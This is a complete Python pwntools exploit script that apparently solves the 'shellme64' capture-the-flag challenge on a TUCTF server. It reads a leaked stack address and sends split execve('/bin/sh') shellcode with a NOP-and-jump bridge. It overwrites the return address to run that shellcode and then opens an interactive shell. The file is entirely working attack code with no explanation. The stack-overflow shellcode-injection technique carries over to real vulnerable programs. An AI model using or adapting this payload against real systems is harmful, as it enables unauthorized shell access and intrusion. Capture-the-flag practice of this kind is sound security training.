#!/usr/bin/python3
from pwn import *
context.arch = 'amd64'

p = remote('chal.tuctf.com', 30507)
# p = process('./shellme64')
p.recvuntil(b'\x0a')
stack = int(p.recvuntil(b'\x0a'), 16)

log.info('stack: %s' % hex(stack))

sc1 = asm('''
    mov rax, 0x68732f6e69622f # 10 bytes
    push rax # 1 byte
    mov rdi, rsp # 3 bytes
    xor rsi, rsi # 3 bytes
    xor rdx, rdx # 3 bytes
    ''')

jmp_p8 = b'\x90' * 18 + b'\xeb\x08'

sc2 = asm('''
    mov rax, 59
    syscall
    ''')

payload = sc1 + jmp_p8 + p64(stack) + sc2
p.sendline(payload)

p.interactive()
